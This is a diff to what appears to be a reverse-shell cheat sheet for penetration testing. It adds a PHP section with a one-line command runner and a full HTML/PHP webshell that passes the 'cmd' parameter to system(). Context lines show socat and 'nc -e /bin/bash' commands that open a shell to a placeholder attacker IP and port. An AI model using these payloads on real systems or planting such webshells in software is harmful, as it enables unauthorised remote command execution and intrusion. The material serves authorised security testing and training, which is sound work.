@@ -31,6 +31,32 @@ socat TCP:<attacker_ip>:<attacker_port> EXEC:/bin/sh
 nc -e /bin/bash <attacker_ip> <attacker_port>
 ```
 
+#### PHP Reverse Shells
+1. **Basic PHP command prompt**
+```bash
+<?php system($_GET['cmd']); ?>
+```
+
+2. **PHP webshell**
+
+```bash
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd'] . ' 2>&1');
+    }
+?>
+</pre>
+</body>
+</html>
+```
 #### Windows Reverse Shells
 
 1. **PowerShell Reverse Shell**
